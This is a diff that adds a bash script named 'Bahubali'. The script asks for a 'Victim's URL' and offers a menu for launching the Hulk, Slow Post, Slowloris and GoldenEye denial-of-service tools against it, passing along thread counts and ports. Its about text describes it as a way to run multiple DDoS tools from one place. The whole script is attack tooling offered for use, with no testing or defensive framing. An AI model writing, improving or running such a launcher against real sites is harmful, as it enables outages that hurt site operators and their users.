@@ -1,0 +1,99 @@
+#!/bin/bash
+#set -x
+cat << "ASCII"
+
+
+  ____        _           _           _ _ 
+ |  _ \      | |         | |         | (_)
+ | |_) | __ _| |__  _   _| |__   __ _| |_ 
+ |  _ < / _` | '_ \| | | | '_ \ / _` | | |
+ | |_) | (_| | | | | |_| | |_) | (_| | | |
+ |____/ \__,_|_| |_|\__,_|_.__/ \__,_|_|_|
+                                          
+                                          
+
+
+ASCII
+echo "Enter the Victim's URL with http:/https:"
+read url
+
+while [[ !  $url =~ https?://  ]]; do
+	read -p "You have not used HTTP or HTTPS, Please Enter Again else the tools wont work. Enter Again : " url
+
+done
+#echo "Reaches Here"
+read F
+clear
+function menu() {
+echo "Victim's URL is $url"
+echo "Choose any option"
+echo "(1) Hulk"
+echo "(2) Slow Post DoS"
+echo "(3) SlowORis"
+echo "(4) GoldenEye"
+echo "(5) About Bahubali"
+echo "(6) Exit"
+read -p "Enter the option number : " option
+while [[ $option -le 0 || $option -ge 6 ]]; do
+	read -p "Invalid Input, Please Enter Again : " option
+done
+return $option
+}
+menu "$url" $option
+echo "Your selected option is $option"
+read -n1 -r -p "Press any key to continue..." key
+if [ $option -eq 1 ]; then
+clear
+echo "Press Enter to Begin Hulk Atack"
+read fun
+clear
+python hulk.py $url
+
+elif [ $option -eq 2 ]; then
+clear
+echo  "Enter the no of threads eg 256"
+read threadst
+clear
+echo "enter the web server port eg 80"
+read portt
+clear
+echo "Press Enter to Begin Attack"
+read funt
+clear
+python 2.py -t $url -r $threadst -p $portt -T
+elif [ $option -eq 3 ]; then
+clear
+echo "May The Force Be With You"
+echo "Press Enter to Attack"
+read fun
+perl 3.pl -dns $url  -options
+elif [ $option -eq 4 ]; then
+echo "007 Attack starting"
+echo "Under Heavy Testing would not work"
+echo "GoldenEye Attack initiated"
+read fun
+python goldeneye.py $url
+elif [ $option -eq 6 ]; then
+echo "GoodBye"
+exit
+elif [ $option -eq 5 ]; then
+clear
+echo "ONE TOOL TO RULE THEM ALL"
+cat << "A"
+
+
+  ____        _           _           _ _ 
+ |  _ \      | |         | |         | (_)
+ | |_) | __ _| |__  _   _| |__   __ _| |_ 
+ |  _ < / _` | '_ \| | | | '_ \ / _` | | |
+ | |_) | (_| | | | | |_| | |_) | (_| | | |
+ |____/ \__,_|_| |_|\__,_|_.__/ \__,_|_|_|
+                                          
+                                          
+
+
+A
+echo "Bahubali is a tool which allows you to execute any one of the multiple DDOS tools through one single tool"
+
+read about
+fi
